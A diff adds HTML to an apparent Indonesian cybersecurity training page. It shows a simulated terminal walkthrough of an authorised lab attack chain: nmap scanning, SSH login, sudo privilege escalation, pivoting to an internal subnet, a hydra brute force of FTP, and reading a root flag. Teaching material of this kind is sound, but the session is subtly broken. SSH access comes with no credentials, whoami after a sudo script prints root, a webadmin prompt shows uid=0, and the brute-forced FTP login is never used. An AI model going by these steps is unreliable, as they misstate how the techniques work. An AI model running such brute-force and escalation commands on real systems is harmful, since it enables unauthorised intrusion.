+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">satu sesi penuh — salin dan nikmati alurnya</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-cmd">student@cyberguard:~$</span> cat lab/targets.txt &amp;&amp; cat lab/roa.txt
+<span class="t-dim">192.168.1.10  lab-web-01       (web, in-scope)</span>
+<span class="t-dim">10.0.5.7      lab-internal-01  (internal, in-scope)</span>
+<span class="t-ok">ROA: izin tertulis untuk kedua host — mulai.</span>
+
+<span class="t-cmd">student@cyberguard:~$</span> nmap -sV 192.168.1.10
+<span class="t-dim">PORT   STATE SERVICE VERSION</span>
+<span class="t-ok">22/tcp open  ssh     OpenSSH 8.2p1</span>
+<span class="t-ok">80/tcp open  http    Apache httpd 2.4.49</span>
+<span class="t-cmd">student@cyberguard:~$</span> ssh webadmin@lab-web-01
+<span class="t-cmd">student@cyberguard:~$</span> <span class="t-comment"># port 22 terbuka — langsung masuk lewat port itu</span>
+<span class="t-ok">Welcome to lab-web-01 — akses shell berhasil</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> id
+<span class="t-dim">uid=1001(webadmin) gid=1001(webadmin)</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> sudo -l
+<span class="t-dim">User webadmin may run: (root) NOPASSWD: /opt/backup.sh</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> sudo /opt/backup.sh &amp;&amp; whoami
+<span class="t-hot">root</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> ip route
+<span class="t-dim">10.0.5.0/24 via 192.168.1.1  — segmen internal terlihat</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> nmap -sV 10.0.5.7
+<span class="t-dim">PORT   STATE SERVICE VERSION</span>
+<span class="t-ok">21/tcp open  ftp     vsftpd 2.3.4</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7
+<span class="t-ok">[21][ftp] host: 10.0.5.7   login: guest   password: secret123</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> id &amp;&amp; whoami &amp;&amp; cat /root/root.txt
+<span class="t-dim">uid=0(root) gid=0(root)  →  root</span>
+<span class="t-ok">FLAG{pwn-root} — root di lab-web-01 &amp; internal terkompromi</span>
+<span class="t-cmd">webadmin@lab-web-01:~/</span> score
+<span class="t-ok">Misi: nmap→ssh→root→pivot→ftp — SEMUA TUNTAS</span></pre></div>
+          </div>
+
+          <div class="alert alert-success" style="margin-top:26px">
+            <svg><use href="#ic-shield-check"/></svg>
+            <div><strong>Itu dia satu proses</strong><p>Satu rantai tanpa jeda: <em>nmap</em> memberi port, <em>ssh</em> memakainya, <em>sudo</em> menaikkan hak, <em>route+nmap</em> membuka segmen berikutnya, <em>hydra</em> menembus layanan internal, dan <em>root.txt + score</em> menutup siklus. Di sisi lawan ada alur sebaliknya yang sama-sama berkesinambungan — lihat <a href="defensive.html#simulasi">Praktek Defensive</a>.</p></div>
           </div>
         </section>
 
